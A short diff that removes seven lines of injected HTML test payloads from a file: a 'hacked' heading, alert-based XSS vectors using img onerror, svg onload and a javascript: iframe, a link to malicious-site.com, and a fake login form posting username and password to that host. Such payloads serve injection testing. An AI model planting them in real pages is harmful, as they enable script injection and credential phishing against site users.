@@ -1,7 +1,0 @@
-<h1>hacked</h1>
-<b>Bold Injection</b>
-<img src='x' onerror='alert("Syeda Manal Ammad")'>
-<a href='http://malicious-site.com'>Click Here</a>
-<svg/onload=alert("Mike testing")>
-<iframe src='javascript:alert("HTML Injection")'></iframe>
-<form action='https://malicious-site.com' method='POST'><input type='text' name='username'><input type='password' name='password'><input type='submit' value='Login'></form>
